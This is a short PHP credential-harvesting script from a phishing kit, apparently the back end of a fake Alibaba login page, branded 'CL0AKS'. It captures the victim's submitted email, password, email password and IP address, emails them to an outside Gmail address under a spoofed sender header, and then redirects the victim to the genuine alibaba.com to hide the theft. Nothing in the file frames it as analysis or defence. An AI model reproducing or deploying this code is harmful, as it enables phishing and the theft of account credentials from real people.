<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------------CL0AKS ReSulT--------------------\n";
$message .= "Email Add  : ".$_POST['login']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "Emailpwd : ".$_POST['pwd']."\n";
$message .= "----------------created by CL0AKS-------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "-----------------CL0AKS ReSulT--------------------\n";
$send = "mailservice658@gmail.com";
$subject = "CL0AKS ReZulTs";
$headers = "From: ReZult<Aa00Libz@Aa00Libz.edu>";
$headers .= $_POST['mailservice658@gmail.com']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers);
?>
<script>
    window.top.location.href = "https://www.alibaba.com/";

</script>